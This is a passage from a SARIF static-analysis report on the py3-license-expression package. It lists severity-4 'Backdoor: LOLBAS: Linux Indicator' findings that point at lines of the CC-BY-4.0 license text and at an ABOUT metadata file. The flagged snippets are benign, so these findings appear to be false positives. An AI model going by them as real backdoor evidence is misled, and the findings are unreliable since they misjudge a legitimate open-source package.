                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/data/cc-by-4.0.LICENSE"
                },
                "region": {
                  "startLine": 120,
                  "startColumn": 52,
                  "endLine": 120,
                  "endColumn": 56,
                  "snippet": {
                    "text": "     as reproduction, public display, public performance, distribution,\n     dissemination, communication, or importation, and to make material\n     available to the public including in ways that members of the\n     public may access the material from a place and at a time\n     individually chosen by them.\n\n  j. Sui Generis Database Rights means rights other than copyright\n",
                    "rendered": {
                      "text": "     as reproduction, public display, public performance, distribution,\n     dissemination, communication, or importation, and to make material\n     available to the public including in ways that members of the\n     public may access the material from a place and at a time\n     individually chosen by them.\n\n  j. Sui Generis Database Rights means rights other than copyright\n",
                      "markdown": "`     as reproduction, public display, public performance, distribution,\n     dissemination, communication, or importation, and to make material\n     available to the public including in ways that members of the\n     public may access the material from a place and at a time\n     individually chosen by them.\n\n  j. Sui Generis Database Rights means rights other than copyright\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/data/cc-by-4.0.LICENSE"
                },
                "region": {
                  "startLine": 120,
                  "startColumn": 57,
                  "endLine": 121,
                  "snippet": {
                    "text": "     as reproduction, public display, public performance, distribution,\n     dissemination, communication, or importation, and to make material\n     available to the public including in ways that members of the\n     public may access the material from a place and at a time\n     individually chosen by them.\n\n  j. Sui Generis Database Rights means rights other than copyright\n     resulting from Directive 96/9/EC of the European Parliament and of\n",
                    "rendered": {
                      "text": "     as reproduction, public display, public performance, distribution,\n     dissemination, communication, or importation, and to make material\n     available to the public including in ways that members of the\n     public may access the material from a place and at a time\n     individually chosen by them.\n\n  j. Sui Generis Database Rights means rights other than copyright\n     resulting from Directive 96/9/EC of the European Parliament and of\n",
                      "markdown": "`     as reproduction, public display, public performance, distribution,\n     dissemination, communication, or importation, and to make material\n     available to the public including in ways that members of the\n     public may access the material from a place and at a time\n     individually chosen by them.\n\n  j. Sui Generis Database Rights means rights other than copyright\n     resulting from Directive 96/9/EC of the European Parliament and of\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/_pyahocorasick.ABOUT"
                },
                "region": {
                  "startLine": 21,
                  "startColumn": 9,
                  "endLine": 22,
                  "snippet": {
                    "text": "owner: nexB Inc.\nauthor: Wojciech Mula http://0x80.pl/\n\nvcs_tool: git\nvcs_repository: https://github.com/WojciechMula/pyahocorasick.git\n\n",
                    "rendered": {
                      "text": "owner: nexB Inc.\nauthor: Wojciech Mula http://0x80.pl/\n\nvcs_tool: git\nvcs_repository: https://github.com/WojciechMula/pyahocorasick.git\n\n",
                      "markdown": "`owner: nexB Inc.\nauthor: Wojciech Mula http://0x80.pl/\n\nvcs_tool: git\nvcs_repository: https://github.com/WojciechMula/pyahocorasick.git\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        }
      ],
      "columnKind": "utf16CodeUnits"
    }
  ]
}